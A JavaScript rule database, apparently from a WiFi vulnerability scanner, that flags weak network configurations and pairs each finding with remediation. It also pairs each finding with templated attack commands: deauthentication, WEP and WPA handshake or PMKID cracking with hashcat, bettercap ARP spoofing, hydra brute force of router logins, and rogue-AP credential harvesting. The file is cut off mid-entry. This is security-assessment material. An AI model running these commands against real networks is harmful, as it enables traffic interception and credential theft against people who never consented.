// ── Helpers ───────────────────────────────────────────────────────────────────

function getSecurityLevel(auth) {
  const a = (auth || '').toLowerCase()
  if (!a || a === 'open' || a === 'none') return 'open'
  if (a.includes('wpa3')) return 'wpa3'
  if (a.includes('wpa2')) return 'wpa2'
  if (a.includes('wpa')) return 'wpa'
  if (a.includes('wep')) return 'wep'
  return 'unknown'
}

const DEFAULT_SSID_PATTERNS = [
  /^linksys/i, /^netgear/i, /^dlink/i, /^d-link/i, /^asus/i,
  /^tp-link/i, /^tplink/i, /^belkin/i, /^xfinity/i, /^actiontec/i,
  /^att[a-z0-9]/i, /^verizon[-_]/i, /^spectrum/i, /^motorola/i,
  /^2wire/i, /^westell/i, /^wifi$/i, /^wireless$/i, /^default$/i,
  /^router$/i, /^home$/i, /^DIRECT-[A-Z0-9]/,
]

// ── WiFi Security Rule Database ───────────────────────────────────────────────

const WIFI_RULES = [
  // ── Critical ──────────────────────────────────────────────────────────────

  {
    id: 'open-network',
    match: (n) => {
      const level = getSecurityLevel(n.authentication)
      const enc = (n.encryption || '').toLowerCase()
      return level === 'open' && !enc.includes('wep')
    },
    severity: 'critical', cvss: 9.8,
    title: 'Open Network — No Encryption',
    description: (n) => `"${n.ssid || '(Hidden)'}" broadcasts with no encryption. Every byte of traffic — HTTP requests, credentials, session tokens, DNS queries, emails — is transmitted in plaintext and visible to anyone within radio range using free tools.`,
    remediation: 'Enable WPA3-Personal immediately. If hardware does not support WPA3, use WPA2-Personal with AES/CCMP. Never transmit sensitive data over this network until encryption is enabled.',
    tags: ['no-encryption', 'passive-intercept', 'credential-exposure'],
    exploitSteps: [
      {
        label: 'Enable monitor mode',
        detail: 'Put the wireless adapter into monitor mode so it captures all 802.11 frames in the area, not just those addressed to your MAC. Kill processes that would interfere with the adapter.',
        commands: [
          'ip link show  # identify your wireless interface',
          'sudo airmon-ng check kill  # kill conflicting processes',
          'sudo airmon-ng start wlan0  # creates wlan0mon',
          'sudo iwconfig wlan0mon  # verify monitor mode active',
        ],
      },
      {
        label: 'Capture all traffic',
        detail: 'Lock onto the target AP\'s channel with airodump-ng and write everything to disk for offline analysis. On an open network, all frames are readable — no key needed.',
        commands: [
          '# Survey: find channel for target AP',
          'sudo airodump-ng wlan0mon',
          '# Lock onto target and capture:',
          'sudo airodump-ng --bssid {{bssid}} --channel {{channel}} -w /tmp/capture wlan0mon',
        ],
      },
      {
        label: 'Extract credentials with tshark',
        detail: 'HTTP credentials, session cookies, and form POST data are all readable in plaintext. Tshark display filters isolate auth traffic in seconds.',
        commands: [
          '# HTTP login form submissions (credentials in POST body):',
          'tshark -r /tmp/capture-01.cap -Y "http.request.method == POST" -T fields -e http.request.uri -e http.file_data',
          '# Session cookies:',
          'tshark -r /tmp/capture-01.cap -Y "http.cookie" -T fields -e ip.src -e http.cookie',
          '# Open in Wireshark for full analysis:',
          'wireshark /tmp/capture-01.cap',
        ],
      },
      {
        label: 'Active MITM with bettercap',
        detail: 'bettercap performs ARP spoofing to sit between the victim and gateway. On an open network, no key material is required — frames are already in the clear. Credentials and session tokens stream to the console in real time.',
        commands: [
          'sudo apt install bettercap -y',
          'sudo bettercap -iface wlan0mon',
          '# Inside bettercap REPL:',
          'net.probe on',
          'net.show',
          'set arp.spoof.targets {{victim_ip}}',
          'arp.spoof on',
          'net.sniff on',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Enable WPA3-Personal (SAE)',
        detail: 'WPA3 uses Simultaneous Authentication of Equals — a zero-knowledge proof that resists offline dictionary attacks and provides forward secrecy. Enable it in your router admin panel.',
        commands: [
          '# Router admin panel (usually http://192.168.1.1 or 192.168.0.1):',
          '# Wireless → Security → Security Mode → WPA3-Personal',
          '# For backward compatibility: WPA3/WPA2 Transition Mode',
          '',
          '# Verify WPA3 is active on Linux:',
          'sudo iw dev wlan0 scan | grep -A8 "{{ssid}}" | grep "AKM suites"',
          '# Should show: SAE',
        ],
      },
      {
        label: 'Fall back to WPA2-Personal + AES',
        detail: 'If hardware doesn\'t support WPA3, WPA2-Personal with CCMP (AES) is the minimum acceptable. Never use TKIP.',
        commands: [
          '# Router admin panel:',
          '# Security Mode → WPA2-Personal',
          '# Encryption → AES / CCMP  (not TKIP)',
          '',
          '# Generate a strong 24-character passphrase:',
          'python3 -c "import secrets,string; chars=string.ascii_letters+string.digits; print(\'\'.join(secrets.choice(chars) for _ in range(24)))"',
        ],
      },
      {
        label: 'Enable client isolation',
        detail: 'Client isolation prevents devices on the same network from reaching each other directly, blocking peer-to-peer attacks between connected devices.',
        commands: [
          '# Router admin panel:',
          '# Advanced Wireless → AP Isolation / Client Isolation: Enabled',
          '',
          '# For hostapd-based APs (Linux):',
          'echo "ap_isolate=1" >> /etc/hostapd/hostapd.conf',
          'sudo systemctl restart hostapd',
        ],
      },
      {
        label: 'Update router firmware',
        detail: 'Outdated firmware may lack WPA3 support even on capable hardware. Many routers receive WPA3 via a firmware update.',
        commands: [
          '# Router admin panel → Administration → Firmware Update',
          '# Check current version and compare with vendor\'s latest release',
          '# Download only from your router vendor\'s official support site',
        ],
      },
    ],
  },

  {
    id: 'wep-encryption',
    match: (n) => (n.encryption || '').toLowerCase().includes('wep'),
    severity: 'critical', cvss: 9.5,
    title: 'WEP Encryption — Completely Broken Protocol',
    description: (n) => `"${n.ssid || '(Hidden)'}" uses WEP, a protocol broken in 2001. An attacker can recover the WEP key in under 60 seconds using freely available tools regardless of key length. WEP\'s RC4 IV reuse flaw makes key recovery trivial — longer keys provide no additional protection.`,
    remediation: 'Replace WEP with WPA3-Personal or WPA2-Personal (AES/CCMP) immediately. There is no patch for WEP — it must be replaced. Any data transmitted while WEP was active should be considered compromised.',
    tags: ['broken-encryption', 'wep', 'key-recovery', 'rc4'],
    exploitSteps: [
      {
        label: 'Monitor mode & capture IVs',
        detail: 'Lock airodump-ng to the target AP\'s channel and collect encrypted frames. Each frame contains an Initialization Vector (IV) — we need ~40,000 unique IVs to statistically recover the key.',
        commands: [
          'sudo airmon-ng start wlan0',
          '# Survey to find channel:',
          'sudo airodump-ng wlan0mon',
          '# Lock to target and capture:',
          'sudo airodump-ng --bssid {{bssid}} -c {{channel}} -w /tmp/wep_cap wlan0mon',
        ],
      },
      {
        label: 'Accelerate IV collection (ARP replay)',
        detail: 'Natural traffic yields IVs too slowly. ARP replay injects valid encrypted ARP packets at high speed — each forces the AP to encrypt a response, generating a new unique IV. The #Data counter climbs from hundreds to tens of thousands in minutes.',
        commands: [
          '# Authenticate to the AP (fake auth):',
          'sudo aireplay-ng -1 0 -a {{bssid}} -h {{our_mac}} wlan0mon',
          '# Start ARP replay injection:',
          'sudo aireplay-ng -3 -b {{bssid}} -h {{our_mac}} wlan0mon',
          '# Watch #Data column in airodump-ng — collect 40,000+ IVs',
        ],
      },
      {
        label: 'Crack the WEP key',
        detail: 'Once sufficient IVs are collected, aircrack-ng performs statistical analysis to recover the RC4 key. At 85,000+ IVs, success rate approaches 100%. The crack completes in seconds.',
        commands: [
          '# Run while still collecting (or after):',
          'aircrack-ng /tmp/wep_cap-01.cap',
          '# Output: KEY FOUND! [ AA:BB:CC:DD:EE ]',
          '# Use the recovered key to connect to the network',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Replace WEP with WPA3 or WPA2 immediately',
        detail: 'WEP is not patchable — the flaw is in the protocol design itself. The only fix is replacement. Change the security mode in your router admin panel.',
        commands: [
          '# Router admin panel → Wireless → Security:',
          '# Security Mode → WPA3-Personal (preferred)',
          '# Or: WPA2-Personal with AES/CCMP encryption',
          '',
          '# After changing: all devices must reconnect with the new settings',
          '# The old WEP key is now useless — set a new passphrase',
        ],
      },
      {
        label: 'Replace hardware if WPA2 is unavailable',
        detail: 'If the router is so old it cannot support WPA2 even after a firmware update, it must be replaced. Modern routers with WPA3 are inexpensive.',
        commands: [
          '# Check admin panel for WPA2 option under Wireless → Security',
          '# Check vendor site for firmware updates that may add WPA2',
          '# If WPA2 is unavailable: replace the router — WEP cannot be secured',
        ],
      },
      {
        label: 'Revoke all credentials used on this network',
        detail: 'Any password or session token transmitted while WEP was active must be considered captured. Rotate all account credentials.',
        commands: [
          '# Change all passwords for accounts accessed over this network',
          '# Log out of all active sessions on web services used from here',
          '# Check account activity logs for unauthorized access',
          '# Notify users who connected to this network to rotate their passwords',
        ],
      },
    ],
  },

  // ── High ─────────────────────────────────────────────────────────────────

  {
    id: 'wpa-tkip',
    match: (n) => {
      const level = getSecurityLevel(n.authentication)
      const enc = (n.encryption || '').toLowerCase()
      return (level === 'wpa' || level === 'wpa2') && enc.includes('tkip')
    },
    severity: 'high', cvss: 7.8,
    title: 'TKIP Encryption — Deprecated and Vulnerable',
    description: (n) => `"${n.ssid || '(Hidden)'}" uses TKIP (Temporal Key Integrity Protocol). TKIP was a stop-gap fix for WEP and is now deprecated by the IEEE. It is vulnerable to the Beck-Tews and Ohigashi-Morii attacks which enable decryption and forgery of short packets. TKIP is also disabled by default in modern clients, which can cause compatibility issues.`,
    remediation: 'Switch the AP encryption cipher from TKIP to CCMP (AES) in your router settings. Disable TKIP entirely — all modern devices support AES.',
    tags: ['deprecated-encryption', 'tkip', 'packet-forgery'],
    exploitSteps: [
      {
        label: 'Verify TKIP via passive scan',
        detail: 'Confirm TKIP is in use by examining the Robust Security Network (RSN) information element in the AP\'s beacon frames. Look for "TKIP" in the cipher suite list.',
        commands: [
          'sudo airmon-ng start wlan0',
          'sudo airodump-ng wlan0mon',
          '# The cipher column in airodump shows TKIP vs CCMP',
          '',
          '# Detailed beacon analysis:',
          'sudo iw dev wlan0 scan | grep -A15 "{{ssid}}" | grep -E "TKIP|CCMP|group cipher|pairwise"',
        ],
      },
      {
        label: 'Beck-Tews / tkiptun-ng attack',
        detail: 'The Beck-Tews attack targets TKIP\'s MIC (Michael) algorithm to forge and inject up to 7 packets per minute into the network without key recovery. Requires QoS (802.11e) to be enabled on the AP.',
        commands: [
          '# Capture baseline traffic:',
          'sudo airodump-ng --bssid {{bssid}} -c {{channel}} -w /tmp/tkip_cap wlan0mon &',
          '',
          '# Run tkiptun-ng (part of aircrack-ng suite):',
          'sudo tkiptun-ng -a {{bssid}} -m {{our_mac}} wlan0mon',
          '# This recovers the MIC key for short ARP packets',
          '# Allows injecting ~7 crafted packets per minute',
        ],
      },
      {
        label: 'Capture handshake for offline crack',
        detail: 'Regardless of TKIP vs CCMP, the 4-way handshake can be captured and dictionary-attacked offline.',
        commands: [
          'sudo airodump-ng --bssid {{bssid}} -c {{channel}} -w /tmp/hs wlan0mon',
          '# Deauth to force handshake:',
          'sudo aireplay-ng --deauth 5 -a {{bssid}} wlan0mon',
          '# Convert and crack:',
          'hcxpcapngtool -o /tmp/crack.hc22000 /tmp/hs-01.cap',
          'hashcat -m 22000 /tmp/crack.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Switch to AES/CCMP encryption',
        detail: 'CCMP (Counter Mode CBC-MAC Protocol) using AES is the correct replacement for TKIP. It is required for 802.11n speeds and supported by every device made in the last 10+ years.',
        commands: [
          '# Router admin panel:',
          '# Wireless → Security → Encryption: AES  (not TKIP, not "Mixed")',
          '',
          '# For hostapd (Linux AP):',
          'sudo sed -i "s/wpa_pairwise=.*/wpa_pairwise=CCMP/" /etc/hostapd/hostapd.conf',
          'sudo sed -i "s/rsn_pairwise=.*/rsn_pairwise=CCMP/" /etc/hostapd/hostapd.conf',
          'sudo systemctl restart hostapd',
          '# Verify — should show CCMP only:',
          'sudo iw dev wlan0 scan | grep -A10 "{{ssid}}" | grep -E "pairwise|group"',
        ],
      },
      {
        label: 'Upgrade to WPA3-Personal',
        detail: 'WPA3\'s SAE (Dragonfly) handshake is not vulnerable to offline dictionary attacks, rendering handshake capture useless.',
        commands: [
          '# Router admin panel → Wireless → Security → WPA3-Personal',
          '# Or: WPA3/WPA2 Transition Mode for backward compatibility',
        ],
      },
    ],
  },

  {
    id: 'wpa-personal',
    match: (n) => {
      const level = getSecurityLevel(n.authentication)
      return level === 'wpa'
    },
    severity: 'high', cvss: 7.0,
    title: 'WPA-Personal — Outdated Protocol',
    description: (n) => `"${n.ssid || '(Hidden)'}" uses the original WPA standard, not WPA2 or WPA3. WPA was a transitional fix for WEP and shares several of WEP\'s architectural weaknesses. The 4-way handshake is vulnerable to offline dictionary attacks, and TKIP (WPA\'s cipher) has known packet forgery vulnerabilities.`,
    remediation: 'Upgrade to WPA3-Personal or WPA2-Personal with AES/CCMP. All modern routers manufactured since 2006 support WPA2.',
    tags: ['outdated-protocol', 'wpa', 'dictionary-attack'],
    exploitSteps: [
      {
        label: 'Capture the 4-way handshake',
        detail: 'WPA\'s 4-way handshake contains the material needed to verify passphrase guesses offline. Capture it by monitoring for client reconnects or forcing a reconnect with a deauth.',
        commands: [
          'sudo airmon-ng start wlan0',
          'sudo airodump-ng --bssid {{bssid}} -c {{channel}} -w /tmp/wpa_cap wlan0mon',
          '# Deauth to force client reconnect (separate terminal):',
          'sudo aireplay-ng --deauth 4 -a {{bssid}} wlan0mon',
          '# Watch for "WPA handshake: {{bssid}}" message in airodump',
        ],
      },
      {
        label: 'Crack handshake with hashcat',
        detail: 'Convert the capture and run GPU-accelerated dictionary attacks against the handshake hash. RockyYou + best64 rules covers the vast majority of real-world passphrases.',
        commands: [
          'hcxpcapngtool -o /tmp/crack.hc22000 /tmp/wpa_cap-01.cap',
          'hashcat -m 22000 /tmp/crack.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule',
          '# Targeted: use network name as a base word',
          'echo "{{ssid}}" > /tmp/ssid.txt',
          'hashcat -m 22000 /tmp/crack.hc22000 /tmp/ssid.txt -r /usr/share/hashcat/rules/best64.rule',
          'hashcat -m 22000 /tmp/crack.hc22000 --show',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Upgrade to WPA3-Personal',
        detail: 'WPA3 replaces the 4-way handshake with SAE — a zero-knowledge proof that cannot be dictionary attacked even if captured.',
        commands: [
          '# Router admin panel → Wireless → Security → WPA3-Personal',
          '# If router supports it: WPA3/WPA2 Transition Mode for older clients',
        ],
      },
      {
        label: 'Minimum: WPA2-Personal with AES',
        detail: 'WPA2 with CCMP/AES is the minimum acceptable standard. Disable WPA-only and all TKIP modes.',
        commands: [
          '# Router admin panel:',
          '# Security Mode → WPA2-Personal',
          '# Encryption → AES (CCMP)',
          '# Disable WPA-only and TKIP',
        ],
      },
      {
        label: 'Set a strong passphrase regardless',
        detail: 'While WPA2/3 is the goal, a 20+ character random passphrase makes handshake cracking computationally infeasible with any current hardware.',
        commands: [
          'python3 -c "import secrets,string; chars=string.ascii_letters+string.digits; print(\'\'.join(secrets.choice(chars) for _ in range(24)))"',
        ],
      },
    ],
  },

  // ── Medium ────────────────────────────────────────────────────────────────

  {
    id: 'wpa2-personal-offline-crack',
    match: (n) => {
      const level = getSecurityLevel(n.authentication)
      return level === 'wpa2' && !n.authentication?.toLowerCase().includes('enterprise')
    },
    severity: 'medium', cvss: 5.5,
    title: 'WPA2-Personal — Offline Dictionary Attack Risk',
    description: (n) => `"${n.ssid || '(Hidden)'}" uses WPA2-Personal (pre-shared key). An attacker can extract a PMKID from the AP\'s beacon frames without deauthenticating anyone, or capture the 4-way handshake, then run unlimited offline password guesses. If the passphrase appears in any wordlist or follows a predictable pattern, it will be recovered.`,
    remediation: 'Set a random 20+ character passphrase. Enable WPA3/WPA2 Transition Mode if hardware supports it. Enable Protected Management Frames (PMF/802.11w) to block deauth-based handshake capture.',
    tags: ['wpa2', 'pmkid', 'offline-crack', 'dictionary-attack'],
    exploitSteps: [
      {
        label: 'Clientless PMKID capture',
        detail: 'The PMKID attack (Jens Steube, 2018) extracts a single hash from the AP\'s beacon without any connected clients. Purely passive — no deauth, no traffic injection needed. Works on any WPA2 access point.',
        commands: [
          'sudo apt install hcxdumptool hcxtools -y',
          'sudo airmon-ng start wlan0',
          '# Capture PMKID (clientless, no deauth):',
          'sudo hcxdumptool -i wlan0mon --enable_status=1 -o /tmp/pmkid.pcapng --filterlist_ap={{bssid}} --filtermode=2',
          '# Wait 30-60 seconds, then:',
          'hcxpcapngtool -o /tmp/crack.hc22000 /tmp/pmkid.pcapng',
          'wc -l /tmp/crack.hc22000  # >0 means PMKID captured',
        ],
      },
      {
        label: 'GPU-accelerated dictionary attack',
        detail: 'Run the PMKID hash against wordlists and rule sets with hashcat. A mid-range GPU tests hundreds of millions of passphrases per second. RockyYou alone contains 14 million entries — common passwords fall in seconds.',
        commands: [
          '# Dictionary + rules:',
          'hashcat -m 22000 /tmp/crack.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule',
          '# Targeted: SSID-based guesses (many people use their network name):',
          'echo "{{ssid}}" > /tmp/ssid.txt',
          'hashcat -m 22000 /tmp/crack.hc22000 /tmp/ssid.txt -r /usr/share/hashcat/rules/best64.rule',
          '# Show result if found:',
          'hashcat -m 22000 /tmp/crack.hc22000 --show',
        ],
      },
      {
        label: 'Handshake capture (fallback)',
        detail: 'If PMKID extraction fails, capture the 4-way handshake by deauthenticating a connected client.',
        commands: [
          'sudo airodump-ng --bssid {{bssid}} -c {{channel}} -w /tmp/hs wlan0mon',
          '# Deauth in a separate terminal:',
          'sudo aireplay-ng --deauth 8 -a {{bssid}} wlan0mon',
          '# Convert capture:',
          'hcxpcapngtool -o /tmp/crack.hc22000 /tmp/hs-01.cap',
          'hashcat -m 22000 /tmp/crack.hc22000 /usr/share/wordlists/rockyou.txt',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Enable WPA3 or WPA3/WPA2 Transition Mode',
        detail: 'WPA3-Personal uses SAE (Dragonfly), a PAKE protocol that makes captured handshakes worthless — offline dictionary attacks are impossible regardless of passphrase strength.',
        commands: [
          '# Router admin panel → Wireless → Security:',
          '# Option 1: WPA3-Personal (clients must support WPA3)',
          '# Option 2: WPA3/WPA2 Mixed / Transition Mode (recommended for compatibility)',
          '',
          '# Verify WPA3 is active:',
          'sudo iw dev wlan0 scan | grep -A10 "{{ssid}}" | grep "AKM suites"',
          '# Should include: SAE',
        ],
      },
      {
        label: 'Set a long, random passphrase',
        detail: 'A truly random 20+ character passphrase is outside the reach of any current dictionary or rule-based attack. Avoid words, dates, addresses, or patterns.',
        commands: [
          '# Generate a 24-character cryptographically random passphrase:',
          'python3 -c "import secrets,string; chars=string.ascii_letters+string.digits; print(\'\'.join(secrets.choice(chars) for _ in range(24)))"',
          '# Or a 6-word Diceware passphrase (equally strong, more memorable):',
          'python3 -c "import secrets; words=open(\'/usr/share/dict/words\').read().split(); print(\' \'.join(secrets.choice(words) for _ in range(6)))"',
        ],
      },
      {
        label: 'Enable PMF (Protected Management Frames)',
        detail: '802.11w / PMF encrypts deauthentication frames, blocking the forced-disconnect technique used in handshake capture. Requires: PMF = Required or Capable.',
        commands: [
          '# Router admin panel:',
          '# Advanced Wireless → PMF (802.11w) → Required (or Capable for compatibility)',
          '',
          '# For hostapd:',
          'echo "ieee80211w=2" >> /etc/hostapd/hostapd.conf  # 2=Required, 1=Optional',
          'sudo systemctl restart hostapd',
          '',
          '# Verify: deauth attack should now fail if PMF=Required',
        ],
      },
      {
        label: 'Consider WPA2/3-Enterprise for organizations',
        detail: '802.1X Enterprise mode issues per-device credentials and certificates. Even if one credential is compromised, other users\' sessions cannot be decrypted. Requires a RADIUS server.',
        commands: [
          '# FreeRADIUS setup:',
          'sudo apt install freeradius freeradius-utils -y',
          '# Minimal hostapd 802.1X config:',
          '# ieee8021x=1',
          '# auth_server_addr=127.0.0.1',
          '# auth_server_port=1812',
          '# auth_server_shared_secret=<radius_secret>',
          '# wpa_key_mgmt=WPA-EAP',
        ],
      },
    ],
  },

  {
    id: 'default-ssid',
    match: (n) => n.ssid && DEFAULT_SSID_PATTERNS.some(pat => pat.test(n.ssid)),
    severity: 'medium', cvss: 5.0,
    title: 'Default Vendor SSID — Possible Default Credentials',
    description: (n) => `The SSID "${n.ssid}" matches a known vendor or ISP default name. Routers shipped with default SSIDs frequently still have their default admin credentials set. An attacker can look up published defaults for the identified brand and gain full control of the router — changing DNS, port forwarding rules, or WiFi security settings.`,
    remediation: 'Log into your router admin panel and change the admin password, the SSID, and the WiFi passphrase. Enable automatic firmware updates. Audit port forwarding rules for unauthorized entries.',
    tags: ['default-credentials', 'router-admin', 'information-disclosure'],
    exploitSteps: [
      {
        label: 'Identify router model & look up defaults',
        detail: 'The SSID reveals the manufacturer. Published default credentials are in vendor documentation and sites like routerpasswords.com. Common defaults cover the majority of unconfigured home routers.',
        commands: [
          '# Identify gateway IP (router admin panel):',
          'ip route show default | awk \'{print $3}\'',
          '',
          '# Common default admin credentials by vendor:',
          '# Linksys:  http://192.168.1.1    admin / admin',
          '# Netgear:  http://192.168.1.1    admin / password',
          '# D-Link:   http://192.168.0.1    admin / (blank)',
          '# TP-Link:  http://192.168.0.1    admin / admin',
          '# ASUS:     http://192.168.1.1    admin / admin',
          '# Belkin:   http://192.168.2.1    (blank) / (blank)',
        ],
      },
      {
        label: 'Brute force admin panel (if defaults fail)',
        detail: 'Many router admin panels have no rate limiting. A small targeted credential list covers 95%+ of home router setups.',
        commands: [
          '# Identify gateway IP:',
          'GATEWAY=$(ip route show default | awk \'{print $3}\')',
          '',
          '# Hydra HTTP form attack:',
          'hydra -l admin -P /usr/share/wordlists/metasploit/http_default_passwords.txt $GATEWAY http-get / -V -f',
          '',
          '# Or target the HNAP1 endpoint common to many routers:',
          'hydra -l admin -P /usr/share/wordlists/rockyou.txt $GATEWAY http-get /HNAP1/ -V -f -t 4',
        ],
      },
      {
        label: 'Post-compromise: DNS hijacking',
        detail: 'With router admin access, an attacker changes the DNS server to a malicious resolver. All clients on the network then receive spoofed DNS responses, redirecting them to phishing sites for any domain.',
        commands: [
          '# After admin panel access — check DNS settings:',
          '# WAN → DNS Settings: note if custom DNS is configured',
          '# DHCP → DNS Server: note what\'s pushed to clients',
          '',
          '# Signs of existing DNS hijack:',
          'nslookup google.com <gateway_ip>',
          '# If it returns an unexpected IP, DNS has been tampered with',
          '',
          '# Attacker would set DNS to a rogue resolver they control',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Change router admin password immediately',
        detail: 'Log into the router admin panel and set a strong, unique password that you have never used elsewhere. This is the single most impactful step.',
        commands: [
          '# Find your gateway IP:',
          'ip route show default | awk \'{print $3}\'',
          '# Open http://<gateway-ip> in browser',
          '# Navigate to: Administration → Password (varies by vendor)',
          '',
          '# Generate a strong password:',
          'python3 -c "import secrets,string; print(secrets.token_urlsafe(20))"',
        ],
      },
      {
        label: 'Change the SSID and WiFi passphrase',
        detail: 'Rename the network to something that does not identify the router manufacturer. Also change the WiFi passphrase to a long random string.',
        commands: [
          '# Router admin panel → Wireless → Network Name (SSID)',
          '# Choose a name that reveals nothing about:',
          '# - Router brand or model',
          '# - Your name, address, or apartment number',
          '# - The ISP',
        ],
      },
      {
        label: 'Disable remote management and UPnP',
        detail: 'Remote management allows internet-side access to the admin panel. UPnP lets devices automatically open external ports. Both should be disabled.',
        commands: [
          '# Router admin panel:',
          '# Administration → Remote Management: Disabled',
          '# Advanced → UPnP: Disabled',
          '# WAN → Respond to Ping: Disabled',
        ],
      },
      {
        label: 'Update router firmware',
        detail: 'Default SSID often indicates the router has never been configured — firmware updates patch CVEs and may add WPA3 support.',
        commands: [
          '# Router admin panel → Administration → Firmware Update',
          '# Enable automatic updates if available',
          '# Check your router model against vendor security advisories',
        ],
      },
    ],
  },

  // ── High (additional) ────────────────────────────────────────────────────

  {
    id: 'duplicate-ssid',
    match: (n, all) => {
      if (!n.ssid) return false
      return all.some(other => other !== n && other.ssid === n.ssid && (other.authentication || '') !== (n.authentication || ''))
    },
    severity: 'high', cvss: 7.5,
    title: 'Duplicate SSID — Potential Evil Twin / Rogue AP',
    description: (n) => `The SSID "${n.ssid}" appears in the scan with conflicting authentication settings (${n.authentication}). A second entry with the same name uses different security — a classic indicator of an evil twin or rogue access point attempting to impersonate a legitimate network. Clients may automatically connect to the weaker variant.`,
    remediation: 'Audit your network for unauthorized APs. Deploy a Wireless Intrusion Detection System (WIDS) to alert on duplicate SSIDs. Use WPA3-Enterprise with device certificates so clients reject any AP that cannot present a valid cert.',
    tags: ['evil-twin', 'rogue-ap', 'ssid-spoofing', 'mitm'],
    exploitSteps: [
      {
        label: 'Identify the rogue AP',
        detail: 'Compare BSSIDs (MAC addresses) for both entries with the same SSID. The rogue will have a MAC from a different manufacturer. Use airodump to capture beacon frames from both and compare OUI prefixes.',
        commands: [
          'sudo airmon-ng start wlan0',
          'sudo airodump-ng --essid "{{ssid}}" wlan0mon',
          '# Both APs appear — compare BSSID vendor prefixes',
          '# Look up OUI at: https://macvendors.com',
          '# The unexpected vendor OUI is likely the rogue AP',
        ],
      },
      {
        label: 'Force clients onto rogue AP',
        detail: 'Deauthenticate clients from the legitimate AP. Devices auto-reconnect to the strongest signal — if the rogue AP has higher transmit power, it wins the reconnect race and captures all traffic.',
        commands: [
          '# Deauth clients from legitimate AP:',
          'sudo aireplay-ng --deauth 0 -a {{bssid}} wlan0mon',
          '# Victim reconnects to evil twin — intercept with bettercap:',
          'sudo bettercap -iface wlan0 -eval "net.sniff on"',
        ],
      },
      {
        label: 'Capture credentials via rogue RADIUS (Enterprise)',
        detail: 'For Enterprise networks, hostapd-wpe presents a fake RADIUS server that harvests EAP credentials (MS-CHAPv2 hashes) whenever a client tries to authenticate against the rogue AP.',
        commands: [
          'sudo apt install hostapd-wpe -y',
          'sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf',
          '# Captured credentials stream to:',
          'sudo tail -f /var/log/hostapd-wpe.log',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Deploy Wireless Intrusion Detection (WIDS)',
        detail: 'WIDS continuously monitors the air for duplicate SSIDs and alerts on BSSID changes. Most enterprise-grade APs include this built in.',
        commands: [
          '# Open-source option: kismet',
          'sudo apt install kismet -y',
          'sudo kismet --interface wlan0',
          '# Alerts on: duplicate SSID, new BSSID, deauth floods',
        ],
      },
      {
        label: 'Use WPA3-Enterprise with certificate pinning',
        detail: 'EAP-TLS with client-side CA pinning means clients refuse to authenticate to any AP that cannot present a certificate signed by your private CA — making fake APs useless.',
        commands: [
          '# wpa_supplicant.conf (Linux):',
          '# ca_cert="/etc/certs/company-ca.pem"',
          '# domain_suffix_match="radius.company.internal"',
          '# Windows: Group Policy → Wireless → EAP → verify server cert → pin CA',
        ],
      },
    ],
  },

  {
    id: 'ad-hoc-network',
    match: (n) => {
      const type = (n.networkType || '').toLowerCase()
      return type.includes('hoc') || type.includes('ibss') || type.includes('peer')
    },
    severity: 'high', cvss: 8.0,
    title: 'Ad-Hoc Network — No Centralized Security Enforcement',
    description: (n) => `"${n.ssid || '(Hidden)'}" is operating in Ad-Hoc (IBSS — Independent Basic Service Set) mode — a peer-to-peer WiFi network with no access point. Ad-Hoc networks have no centralized authentication, no gateway firewall, and no traffic segmentation. Any device can join and directly address every other peer on the network at layer 2.`,
    remediation: 'Ad-Hoc networks must not exist in managed environments. Disable IBSS mode via Group Policy (Windows) or wireless configuration profiles. Use Infrastructure mode with a managed AP. Investigate which device created this network.',
    tags: ['ad-hoc', 'ibss', 'peer-to-peer', 'no-firewall'],
    exploitSteps: [
      {
        label: 'Connect and enumerate peers',
        detail: 'Any device can join an ad-hoc network. Once connected, every peer is directly reachable with no NAT or firewall between devices. Layer-2 attacks like ARP spoofing and LLMNR poisoning are immediately available.',
        commands: [
          'sudo nmcli dev wifi connect "{{ssid}}"',
          '# Enumerate peers:',
          'nmap -sn 169.254.0.0/16  # Ad-hoc often uses link-local',
          'nmap -sn 192.168.0.0/24',
          'arp -a  # Show discovered hosts',
        ],
      },
      {
        label: 'Direct device exploitation',
        detail: 'With direct layer-2 access to all peers, run service scans to find open ports. File shares, RDP, SSH, and web management panels are reachable without passing through any firewall.',
        commands: [
          '# Full port scan against a discovered peer:',
          'nmap -sV -O --open <peer_ip>',
          '',
          '# SMB enumeration:',
          'enum4linux -a <peer_ip>',
          'smbclient -L //<peer_ip> -N',
          '',
          '# Responder for hash capture:',
          'sudo responder -I wlan0 -wdF',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Disable IBSS/Ad-Hoc in wireless policy',
        detail: 'Group Policy (Windows) or configuration profiles (macOS/Linux) can prevent devices from creating or joining ad-hoc networks at the OS level.',
        commands: [
          '# Windows Group Policy:',
          '# Computer Config → Windows Settings → Security → Wireless Network Policies',
          '# General → Network type: Infrastructure only',
          '',
          '# Linux wpa_supplicant:',
          'echo "mode=0" >> /etc/wpa_supplicant/wpa_supplicant.conf',
          '# Verify: sudo iw dev wlan0 scan | grep "type IBSS"  ← should be empty',
        ],
      },
    ],
  },

  // ── Medium (additional) ───────────────────────────────────────────────────

  {
    id: 'dense-bssid-cluster',
    match: (n) => n.bssids.length >= 5,
    severity: 'medium', cvss: 5.0,
    title: 'High AP Density — Possible Rogue AP in Cluster',
    description: (n) => `"${n.ssid || '(Hidden)'}" has ${n.bssids.length} access points all broadcasting the same SSID. While enterprise deployments legitimately use many APs, abnormally high BSSID counts increase the probability of at least one unauthorized device in the cluster — rogue APs inserted into large deployments routinely go undetected in routine audits.`,
    remediation: 'Maintain an authoritative AP inventory. Run automated BSSID audits against it daily. Deploy WIDS to alert on new BSSIDs appearing under any SSID.',
    tags: ['high-density', 'rogue-ap-risk', 'bssid-audit', 'wids'],
    exploitSteps: [
      {
        label: 'Fingerprint all BSSIDs in the cluster',
        detail: 'Capture beacon frames from every AP in the cluster. BSSIDs with unexpected OUI prefixes, unusual channels, or significantly higher transmit power than others are rogue candidates.',
        commands: [
